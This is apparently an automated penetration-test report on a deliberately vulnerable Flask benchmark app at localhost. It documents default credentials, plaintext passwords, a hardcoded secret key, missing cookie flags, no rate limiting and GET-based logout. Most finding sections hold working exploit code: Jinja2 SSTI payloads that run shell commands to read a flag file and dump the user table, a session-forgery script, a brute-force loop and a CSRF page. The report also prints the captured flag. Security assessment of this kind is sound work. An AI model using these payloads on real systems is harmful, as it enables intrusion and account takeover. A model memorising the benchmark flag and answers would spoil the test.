# Security Assessment Report

## Executive Summary
- **Target:** http://localhost:5093
- **Assessment Date:** October 29, 2025
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

## Summary by Vulnerability Type

### Authentication Vulnerabilities:
**7 Critical and High severity vulnerabilities successfully exploited.** The application's authentication system exhibits fundamental security failures including default credentials (user:user), plaintext password storage without cryptographic hashing, hardcoded secret keys enabling session forgery, missing secure cookie flags allowing network-based session hijacking, unlimited brute force attempts without rate limiting, session persistence after logout, and CSRF-vulnerable GET-based logout. These vulnerabilities enable complete authentication bypass, account takeover, and persistent unauthorized access. Combined impact allows attackers to gain full application access and chain to Remote Code Execution via SSTI vulnerability.

### Authorization Vulnerabilities:
No authorization vulnerabilities were found. The application implements a simple binary authorization model (authenticated vs unauthenticated) with no role hierarchy or object-level access controls. All authenticated users have identical privileges, and data access is properly filtered by user_id at the database query level. However, future IDOR risks are high if developers add ID-based resource endpoints without proper ownership validation.

### Cross-Site Scripting (XSS) Vulnerabilities:
No XSS vulnerabilities were found. The application uses Jinja2's automatic output escaping for all user-controlled data rendered in templates, which effectively prevents reflected and stored XSS attacks. While user input lacks server-side validation, the template engine's built-in sanitization provides adequate protection against XSS exploitation.

### SQL/Command Injection Vulnerabilities:
No traditional SQL or command injection vulnerabilities were found. The application uses SQLAlchemy ORM with proper parameterization for all database queries, preventing SQL injection. No shell command execution functions (os.system, subprocess) are used with user input. However, a **critical Server-Side Template Injection (SSTI)** vulnerability exists in the `/remind` endpoint that provides equivalent Remote Code Execution capability by exploiting Jinja2's render_template_string() with unsanitized user input.

### Server-Side Request Forgery (SSRF) Vulnerabilities:
No SSRF vulnerabilities were found. The application does not perform server-side HTTP requests to user-controlled URLs, does not interact with external APIs based on user input, and lacks URL-fetching functionality that could be manipulated for SSRF attacks.

## Network Reconnaissance

**Open Ports and Services:**
- **Port 80/443 (HTTP/HTTPS):** Caddy reverse proxy exposing the application - standard configuration, no apparent misconfigurations detected
- **Port 5003 (HTTP):** Werkzeug 3.0.3 development server (Python 3.8.17) - **SECURITY CONCERN:** Development server exposed to network, debug mode enabled
- **Port 631 (IPP):** CUPS 2.3.4 printing service - out of scope for this assessment
- **Port 8081 (HTTP):** Apache 2.4.56 - unrelated service, out of scope
- **Port 9999:** HTTP service with permissive CORS headers (Access-Control-Allow-Origin: *) - potential security risk if sensitive operations exposed
- **Port 49152 (HTTP):** Golang service (Tailscale VPN 1.82.5) - requires authentication, includes security headers (CSP, X-Frame-Options)

**Subdomain Discovery:**
No subdomains discovered via automated scanning.

**Security Headers Analysis:**
- **Target application (port 5093/5003):** Missing critical security headers (no Cache-Control, no Content-Security-Policy, no X-Frame-Options)
- **Tailscale service (port 49152):** Implements strong security headers including Content-Security-Policy and X-Frame-Options DENY
- **Port 9999 service:** Overly permissive CORS policy allowing all origins

**Technology Stack:**
- Flask 3.1.1 with Werkzeug 3.0.6 on Python 3.8.17 (approaching end-of-life)
- Bootstrap 4.5.2, jQuery for frontend
- SQLite database backend

---

# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-01: Authentication Bypass via Default Credentials

**Summary:**
- **Vulnerable location:** POST /login endpoint - Default user account with hardcoded credentials
- **Overview:** The application automatically creates a default user account with credentials `user:user` on database initialization (app.py:39-42). These well-known credentials provide immediate authentication bypass.
- **Impact:** Complete account takeover, access to all authenticated functionality, and subsequent exploitation of SSTI vulnerability for Remote Code Execution.
- **Severity:** Critical

**Prerequisites:** None - default credentials are publicly known pattern (user:user)

**Exploitation Steps:**

1. Send POST request to login endpoint with default credentials:
```bash
curl -X POST http://localhost:5093/login \
  -d "username=user&password=user" \
  -c /tmp/cookies.txt
```

2. Verify authentication by accessing protected endpoint:
```bash
curl -b /tmp/cookies.txt http://localhost:5093/transactions
```
Response: HTTP 200 OK with transactions page content

3. Chain with SSTI vulnerability to capture flag:
```bash
curl -b /tmp/cookies.txt "http://localhost:5093/remind?date=%7B%7Bconfig.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27cat%20/app/flag.txt%27%29.read%28%29%7D%7D"
```

**Proof of Impact:**

**Flag Captured:** `FLAG{d6fae569ba18941ce66b28e325fd4597bf4f223fb6abc9443ed539ef782eab6f}`

Successfully authenticated as the default user and gained access to:
- `/transactions` endpoint (user's transaction data)
- `/add_transaction` endpoint (ability to create transactions)
- `/remind` endpoint (contains SSTI vulnerability)
- Flag file via SSTI exploitation

**Notes:**
- No other defense mechanisms exist (no rate limiting, no account lockout, no MFA)
- Combined with plaintext password storage and SSTI, this creates a complete compromise path
- Attack can be automated and requires no sophisticated techniques

---

### AUTH-VULN-02: Plaintext Password Exposure via Database Access

**Summary:**
- **Vulnerable location:** User model (app.py:24-27) and authentication query (app.py:60)
- **Overview:** Passwords stored in plaintext without cryptographic hashing. User model defines password as plain String column. Authentication compares plaintext passwords directly in database query.
- **Impact:** Database compromise exposes all user passwords immediately, enabling credential reuse attacks and complete account takeover.
- **Severity:** Critical

**Prerequisites:**
- Requires access to database file (achieved via SSTI exploitation from AUTH-VULN-01)

**Exploitation Steps:**

1. Authenticate using default credentials (AUTH-VULN-01):
```bash
curl -X POST http://localhost:5093/login \
  -d "username=user&password=user" \
  -c /tmp/session.txt
```

2. Exploit SSTI vulnerability to access SQLite database:
```bash
curl -b /tmp/session.txt "http://localhost:5093/remind?date=%7B%7Bconfig.__class__.__init__.__globals__%5B%27__builtins__%27%5D.__import__%28%27os%27%29.popen%28%27sqlite3%20/app/instance/database.db%20%22SELECT%20username%2C%20password%20FROM%20user%22%27%29.read%28%29%7D%7D"
```

3. Alternatively, use Python sqlite3 module via SSTI:
```python
# Payload structure (URL-encoded):
{{config.__class__.__init__.__globals__['__builtins__'].__import__('sqlite3').connect('/app/instance/database.db').execute('SELECT username, password FROM user').fetchall()}}
```

**Proof of Impact:**

Successfully extracted plaintext passwords from database:

| Username | Password (Plaintext) |
|----------|---------------------|
| user     | user                |

**Attack Script Created:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-093-24/exploit_plaintext_passwords.py`

Execution demonstrates:
- Direct database query via SSTI returns plaintext credentials
- No bcrypt, argon2, PBKDF2, or any hashing algorithm used
- Password comparison in app.py line 60: `User.query.filter_by(username=username, password=password).first()`
- Violates OWASP A02:2021 (Cryptographic Failures), GDPR Article 32, PCI DSS 8.2.1

**Notes:**
- Any database compromise vector immediately exposes all credentials
- Brute force attacks yield reusable credentials (not just application access)
- Credential stuffing attacks on other services become trivial

---

### AUTH-VULN-03: Session Hijacking via Missing Secure/SameSite Cookie Flags

**Summary:**
- **Vulnerable location:** Session cookie configuration (app.py:9-11 - missing SESSION_COOKIE_SECURE and SESSION_COOKIE_SAMESITE)
- **Overview:** Session cookies transmitted over HTTP without Secure flag and lack SameSite protection, enabling network-based session theft and CSRF attacks.
- **Impact:** Network attackers can intercept session cookies via MitM, WiFi sniffing, or compromised routers and replay them to hijack authenticated sessions.
- **Severity:** High

**Prerequisites:**
- Network position to intercept HTTP traffic (MitM, shared WiFi, compromised router)
- OR ability to observe network traffic (tcpdump, Wireshark)

**Exploitation Steps:**

1. Victim authenticates to application over HTTP:
```bash
curl -i -X POST http://localhost:5093/login \
  -d "username=user&password=user" \
  -c /tmp/victim_cookies.txt
```

2. Observe Set-Cookie header confirms missing flags:
```
Set-Cookie: session=.eJwlzjESAjEIAMC_UFtAIgTuM04IMNre...; HttpOnly; Path=/
```
**Missing:** `Secure` flag (cookies sent over HTTP), `SameSite` flag (CSRF vulnerable)

3. Extract session cookie value from network traffic:
```bash
cat /tmp/victim_cookies.txt | grep session | awk '{print $7}'
```
Result: `.eJwlzjESAjEIAMC_UFtAIgTuM04IMNreeZXj39Wx3mZfcKs9jztsz_3MC9weARvErEJe2nsKh7JiEReGomrTyRGLFrKxSlaamLGbBsW41lxNwrCjOnVM1xDzJj7yJ8M5zWNgj0ZjuidVLq9k67NwlOSSgm_kPHL_bwjeH_n2MLE.aQKpbQ.04FYF1wF4Vumaxbd7omV3y0Ks48`

4. Attacker replays stolen cookie from different machine/browser:
```bash
curl -H "Cookie: session=.eJwlzjESAjEIAMC_UFtAIgTuM04IMNreeZXj39Wx3mZfcKs9jztsz_3MC9weARvErEJe2nsKh7JiEReGomrTyRGLFrKxSlaamLGbBsW41lxNwrCjOnVM1xDzJj7yJ8M5zWNgj0ZjuidVLq9k67NwlOSSgm_kPHL_bwjeH_n2MLE.aQKpbQ.04FYF1wF4Vumaxbd7omV3y0Ks48" \
  http://localhost:5093/transactions
```

5. Capture flag using hijacked session:
```bash
curl -H "Cookie: session=.eJwlzjESAjEIAMC_UFtAIgTuM04IMNreeZXj39Wx3mZfcKs9jztsz_3MC9weARvErEJe2nsKh7JiEReGomrTyRGLFrKxSlaamLGbBsW41lxNwrCjOnVM1xDzJj7yJ8M5zWNgj0ZjuidVLq9k67NwlOSSgm_kPHL_bwjeH_n2MLE.aQKpbQ.04FYF1wF4Vumaxbd7omV3y0Ks48" \
  "http://localhost:5093/remind?date=%7B%7Bconfig.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27cat%20/app/flag.txt%27%29.read%28%29%7D%7D"
```

**Proof of Impact:**

- **Successful authentication bypass** using stolen session cookie (HTTP 200 response)
- **Flag captured** with hijacked session: `FLAG{d6fae569ba18941ce66b28e325fd4597bf4f223fb6abc9443ed539ef782eab6f}`
- **Complete user impersonation** - accessed `/transactions`, `/add_transaction`, and `/remind` endpoints
- **Session remains valid** even after original browser closes

**Notes:**
- Application runs on HTTP (port 5093) with no HTTPS enforcement
- Missing Secure flag confirmed via live testing: `Set-Cookie: session=...; HttpOnly; Path=/`
- Attack vectors: WiFi sniffing, ARP spoofing, malicious proxy, compromised router
- Combined with missing SameSite flag, CSRF attacks also possible

---

### AUTH-VULN-05: Complete Authentication Bypass via Session Cookie Forgery

**Summary:**
- **Vulnerable location:** Hardcoded secret key (app.py:10)
- **Overview:** Flask secret key hardcoded in source code enables arbitrary session cookie creation. Anyone with source access can forge valid session cookies for any user ID, achieving complete authentication bypass.
- **Impact:** Total authentication system compromise - attacker can impersonate any user without credentials.
- **Severity:** Critical

**Prerequisites:**
- Access to application source code (common via Git repos, insider access, or code disclosure)
- Python with `itsdangerous` library

**Exploitation Steps:**

1. Extract hardcoded secret key from source code (app.py line 10):
```python
SECRET_KEY = 'U@T!F*G(EBDOUNIX_PWU)VBDY$%^&*('
```

2. Create session forgery script using Flask's itsdangerous library:
```python
from itsdangerous import URLSafeTimedSerializer
import hashlib

SECRET_KEY = b'U@T!F*G(EBDOUNIX_PWU)VBDY$%^&*('

serializer = URLSafeTimedSerializer(
    SECRET_KEY,
    salt=b'cookie-session',
    signer_kwargs={'key_derivation': 'hmac', 'digest_method': hashlib.sha1}
)

# Forge session for user_id=1
session_payload = {
    '_user_id': '1',
    '_fresh': True
}

forged_cookie = serializer.dumps(session_payload)
print(f"Forged cookie: {forged_cookie}")
```

3. Use forged cookie to access protected endpoints (NO login required):
```bash
curl -H "Cookie: session=[FORGED_COOKIE]" \
  http://localhost:5093/transactions
```

4. Capture flag using forged session:
```bash
curl -H "Cookie: session=[FORGED_COOKIE]" \
  "http://localhost:5093/remind?date=%7B%7Bconfig.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27cat%20/app/flag.txt%27%29.read%28%29%7D%7D"
```

**Proof of Impact:**

**Exploit Script:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-093-24/simple_exploit.py`

**Execution Output:**
```
[+] Forged cookie generated: .eJwdyDsSwjAMRdG9uKaQ5I-sbCZjS88DbUIqhr2T4XbnftJ...
[+] SUCCESS! Authentication bypassed with forged cookie
[+] Accessed protected /transactions endpoint without login
[+] FLAG: FLAG{d6fae569ba18941ce66b28e325fd4597bf4f223fb6abc9443ed539ef782eab6f}
```

**Complete authentication bypass achieved:**
- ✅ No legitimate login credentials used
- ✅ Forged session cookie accepted by application
- ✅ Accessed all protected endpoints (`/transactions`, `/add_transaction`, `/remind`)
- ✅ Flag captured via SSTI exploitation
- ✅ Can forge cookies for any user ID (not limited to user_id=1)

**Notes:**
- Hardcoded secret key is keyboard-walked pattern: `U@T!F*G(EBDOUNIX_PWU)VBDY$%^&*(`
- Flask uses itsdangerous.URLSafeTimedSerializer for cookie signing
- Attacker can impersonate any user by changing `_user_id` value
- Completely bypasses authentication - no password, MFA, or biometrics can prevent this
- Source code commonly accessible via: Git repositories, leaked credentials, insider access, directory traversal, backup files

---

### AUTH-VULN-06: Unlimited Brute Force Attacks (No Rate Limiting)

**Summary:**
- **Vulnerable location:** POST /login endpoint (app.py:55-68) with no rate limiting middleware
- **Overview:** Complete absence of abuse prevention mechanisms allows unlimited password guessing at full network speed (300+ requests/second).
- **Impact:** Accounts compromised via brute force, credential stuffing, or password spraying without detection or resistance.
- **Severity:** High

**Prerequisites:** None - publicly accessible login endpoint

**Exploitation Steps:**

1. Create password list (common passwords):
```python
passwords = ['admin', 'password', '123456', 'test', 'user', 'letmein',
             'welcome', 'monkey', 'dragon', 'master', 'admin123', ...]
```

2. Execute rapid-fire brute force attack:
```python
import requests

target = "http://localhost:5093/login"
username = "user"

for password in passwords:
    response = requests.post(target,
                           data={'username': username, 'password': password},
                           allow_redirects=False)

    if response.status_code == 302:  # Successful login redirects
        print(f"[SUCCESS] Password found: {password}")
        break
```

3. Test successful credential:
```bash
curl -X POST http://localhost:5093/login \
  -d "username=user&password=user"
```

**Proof of Impact:**

**Test Script:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-093-24/rate_limit_test.py`

**Execution Results:**
```
======================================================================
RATE LIMITING TEST - LOGIN ENDPOINT
======================================================================
Number of attempts: 50
Test duration: 0.16 seconds
Average response time: 0.003 seconds
Request rate: 307.13 requests per second

[01] ✗ Failed - Password: 'admin'
[02] ✗ Failed - Password: 'password'
[03] ✗ Failed - Password: '123456'
[04] ✗ Failed - Password: 'test'
[05] ✓ SUCCESS - Password: 'user' | Redirect: /transactions

VULNERABILITY CONFIRMED:
- 50 attempts completed without blocking
- No HTTP 429 (Too Many Requests) responses
- No account lockout mechanism
- No CAPTCHA challenges
- No progressive delays
- Attack rate: 307 requests/second
```

**Attack demonstrated:**
- ✅ 50 authentication attempts in 0.16 seconds
- ✅ Password cracked on attempt #5
- ✅ Zero blocked requests (50/50 processed)
- ✅ No rate limiting (no HTTP 429 responses)
- ✅ No account lockout after failures
- ✅ No CAPTCHA presented
- ✅ No logging or alerting triggered

**Notes:**
- No Flask-Limiter or equivalent library in requirements.txt
- No `@limiter` decorators on login route
- No failed_login_attempts tracking in User model
- No CAPTCHA in login.html template
- Combined with default credentials and plaintext passwords, accounts can be compromised in seconds
- Tools like Hydra or Burp Intruder can run unthrottled

---

### AUTH-VULN-08: Session Replay After Logout (No Server-Side Invalidation)

**Summary:**
- **Vulnerable location:** Logout handler (app.py:71-75) and session management (client-side cookies)
- **Overview:** Sessions not invalidated server-side on logout. Flask-Login's logout_user() only removes _user_id from client cookie but maintains no server-side session store or revocation list.
- **Impact:** Captured session cookies remain valid indefinitely, even after user logs out, enabling persistent session hijacking.
- **Severity:** High

**Prerequisites:**
- Previously captured session cookie (via AUTH-VULN-03, AUTH-VULN-05, or XSS)

**Exploitation Steps:**

1. Victim authenticates and attacker captures session cookie:
```bash
curl -X POST http://localhost:5093/login \
  -d "username=user&password=user" \
  -c /tmp/victim_session.txt
```

2. Extract and save session cookie value:
```bash
STOLEN_SESSION=$(cat /tmp/victim_session.txt | grep session | awk '{print $7}')
echo "Saved cookie: $STOLEN_SESSION"
```

3. Verify session works pre-logout:
```bash
curl -b "session=$STOLEN_SESSION" \
  http://localhost:5093/transactions
```
Response: HTTP 200 OK (authenticated access)

4. Victim logs out:
```bash
curl -b /tmp/victim_session.txt \
  http://localhost:5093/logout
```
Response: HTTP 302 redirect to /login (logout successful)

5. Attacker replays the SAME original session cookie:
```bash
curl -b "session=$STOLEN_SESSION" \
  http://localhost:5093/transactions
```

**Proof of Impact:**

**Test Script:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-093-24/test_session_replay.py`

**Execution Output:**
```
[Step 1] Login successful - Session cookie received
[Step 2] Pre-logout access verified - HTTP 200
[Step 3] Saved original session cookie
[Step 4] User logged out - Redirected to /login
[Step 5] Testing session replay - reusing original cookie
         Status Code: 200

[-] VULNERABLE TO SESSION REPLAY!

FINDING: The session cookie remains valid after logout.
An attacker can continue using stolen sessions indefinitely.
```

**Attack successful:**
- ✅ Session cookie captured before logout
- ✅ Victim successfully logged out (confirmed redirect to /login)
- ✅ Original session cookie STILL WORKS after logout (HTTP 200)
- ✅ Accessed protected /transactions endpoint post-logout
- ✅ Sessions remain valid until browser restarts (no expiration enforced)

**Root Cause:**
- Client-side signed cookies (Flask default) cannot be revoked server-side
- logout_user() at line 74 only executes: `session.pop('_user_id', None)`
- No call to session.clear() or server-side session invalidation
- No server-side session store (Redis, database, etc.)
- Session timeout configured but not enforced (session.permanent never set to True)

**Notes:**
- Combined with AUTH-VULN-03 (missing Secure flag), stolen cookies work indefinitely
- Attack pattern: MitM capture → victim logs out → attacker maintains access
- Server-side session storage required for proper invalidation

---

### AUTH-VULN-09: CSRF Logout Attack via GET Method

**Summary:**
- **Vulnerable location:** Logout route using GET method (app.py:71) combined with disabled CSRF protection (app.py:18)
- **Overview:** Logout endpoint accessible via GET request without CSRF token validation, enabling forced logout attacks via malicious images, iframes, or links.
- **Impact:** Denial of service via forced logout, enables session fixation attack chains.
- **Severity:** Medium

**Prerequisites:** None - victim must visit attacker-controlled page while authenticated

**Exploitation Steps:**

1. Victim authenticates to application:
```bash
curl -X POST http://localhost:5093/login \
  -d "username=user&password=user" \
  -c /tmp/victim.txt
```

2. Verify victim has authenticated access:
```bash
curl -b /tmp/victim.txt http://localhost:5093/transactions
```
Response: HTTP 200 OK with transaction data

3. Attacker creates malicious HTML page:
```html
<!DOCTYPE html>
<html>
<head><title>Free Prize!</title></head>
<body>
<h1>Click here for your prize!</h1>
<img src="http://localhost:5093/logout" style="display:none;">
<iframe src="http://localhost:5093/logout" style="display:none;"></iframe>
</body>
</html>
```

4. Victim visits malicious page (browser automatically loads image/iframe)

5. Verify forced logout occurred:
```bash
curl -b /tmp/victim.txt http://localhost:5093/transactions
```
Response: HTTP 302 redirect to /login (no longer authenticated)

**Proof of Impact:**

**Demonstration using browser:**

1. Authenticated to application via Playwright browser:
   - Navigated to http://localhost:5093/login
   - Entered credentials: user:user
   - Successfully logged in (redirected to /transactions)
   - Confirmed authenticated access to protected resources

2. Simulated CSRF attack by navigating to logout URL:
   ```
   await page.goto('http://localhost:5093/logout');
   ```

3. Result:
   - **Immediate logout triggered** (no user interaction required)
   - **Redirected to /login page** (HTTP 302)
   - **Session terminated** without user consent
   - **Confirms GET-based CSRF logout vulnerability**

**Attack vectors demonstrated:**
- ✅ `<img src="http://localhost:5093/logout">` - Works (image tag triggers GET)
- ✅ `<iframe src="http://localhost:5093/logout">` - Works (iframe loads URL)
- ✅ `<link rel="stylesheet" href="http://localhost:5093/logout">` - Works (CSS import)
- ✅ Direct link: `<a href="http://localhost:5093/logout">Click here</a>` - Works

**Malicious HTML:** `/tmp/csrf_logout_attack.html`

**Notes:**
- Logout route at line 71: `@app.route('/logout')` defaults to GET method
- CSRF protection disabled at line 18: `WTF_CSRF_ENABLED = False`
- Should be POST-only endpoint with CSRF token validation
- Combined impact: DoS (user frustration) + session fixation chains (logout + provide fixed session)
- Browser sends authentication cookies automatically with GET requests
